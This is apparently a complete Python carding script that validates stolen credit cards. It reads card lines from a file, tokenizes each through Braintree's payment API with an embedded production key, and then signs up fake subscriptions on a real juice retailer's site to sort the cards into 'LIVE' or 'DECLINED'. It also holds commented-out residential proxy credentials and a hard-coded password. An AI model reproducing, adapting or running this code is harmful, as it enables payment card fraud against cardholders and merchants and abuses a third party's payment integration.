# encoding=utf8
import requests, json, time, random, uuid, string, re
from base64 import b64encode
from urllib.parse import quote_plus, urlencode
requests.packages.urllib3.disable_warnings()

def random_string_alpha(length):
	choices = string.ascii_lowercase
	return "".join(random.choices(choices, k=length))
def random_string_numbers(length):
	choices = string.digits
	return "".join(random.choices(choices, k=length))
def random_string_full(length):
	choices = string.ascii_lowercase + string.digits
	return "".join(random.choices(choices, k=length))

def one(cc):
	if len(cc.split("|")) == 4:
		cardNumber, exp, cvv, pc = cc.split("|")  # 5312150000597406|05/23|852|10080
	elif len(cc.split("|")) == 5:
		cardNumber, exp, cvv, pc, fullname = cc.split("|")  # 5312150000597406|05/23|852|10080
	else:
		cardNumber, exp, cvv = cc.split("|")
		pc = 10080
	month, year = exp.split("/") #show me one sample
	# print(f"""Card Number: {cardNumber}
	# Expiry: {month}/{year}
	# CVV: {cvv}
	# Zip: 30030
	# """)

	# proxies = {"https": "https://127.0.0.1:8080"}
	#proxies = {
	#	"http": "http://owlshopchecker:Upwork4099_country-in@geo.iproyal.com:12323",
    #	"https": "http://owlshopchecker:Upwork4099_country-in@geo.iproyal.com:12323"
	#}
	get_requ = requests.get('https://payments.braintree-api.com/graphql',headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Pragma":"no-cache","Accept":"*/*"},timeout=15,verify=False)
	if get_requ.status_code == 200:
		js_t = get_requ.json()['extensions']['requestId']
	else:
		return get_requ.text
	p_data = """{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"%s"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"%s","expirationMonth":"%s","expirationYear":"%s","cvv":"%s","billingAddress":{"postalCode":"%s"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}""" % (js_t,cardNumber,month,year,cvv,pc)
	next_requ = requests.post('https://payments.braintree-api.com/graphql',headers={"Authorization":"Bearer production_q7kftnzq_fftwgg3rwvbg7vk3","Braintree-Version":"2018-05-10","Connection":"keep-alive","Content-Type":"application/json","Host":"payments.braintree-api.com","Origin":"https://assets.braintreegateway.com","Referer":"https://assets.braintreegateway.com/","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"},data=p_data,verify=False)

	if next_requ.status_code == 200:
		c_token = next_requ.json()['data']['tokenizeCreditCard']['token']
	else:
		return next_requ.text
	n_data = """{"query":" mutation ($registrationRequest: RegistrationRequest!) { userRegister(input: $registrationRequest) { errorMessage data { token user { id firstName lastName email wallet { tier cardNumber } subscription { price } } } } } ","variables":{"registrationRequest":{"firstName":"amit","lastName":"singh","email":"rdp%s99@gmail.com","password":"Pallushort@123","phone":"7036467752","acceptsEmailMarketing":true,"acceptsArbitrationTerms":true,"acceptsPrivacyTerms":true,"subscription":{"planId":"_10","isSavedCard":false,"paymentToken":"%s","acceptsVipTerms":true}}}}""" % (random.randint(111,9999999),c_token)
	fi_requ = requests.post('https://graphql.pressedjuicery.com/',headers={"Content-Type":"application/json","device-os":"Windows","origin":"https://pressed.com","pressed-campaign-id":"null","pressed-template-id":"null","referer":"https://pressed.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36","sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"cross-site"},data=n_data,verify=False)

	if fi_requ.status_code == 200:
		if fi_requ.json()['data']['userRegister']['errorMessage'] != "Invalid Postal Code":
			return "DECLINED❌\nCHARGED 0.1$❌\n\nWait 5sec before next check!".encode('utf-8'), 1
		else:
			return "LIVE✅\nCHARGED 0.1$✅\n\nWait 5sec before next check!".encode('utf-8'), 1
	else:
		return "INVALID RESPONSE❌\nPlease try again!\n\nWait 5sec before next check!".encode('utf-8'), 0


f = open("results.csv", "w", encoding='utf-8')
f.write("cc, response\n")
cclist = open("details.txt", 'r').readlines()
for cc in cclist:
    cc = cc.strip()
    r, code = one(cc)
    r = r.decode('utf-8').replace("\n", " ")
    print(cc, r)
    f.write(f"{cc}, {r}\n")
    time.sleep(5)
f.close()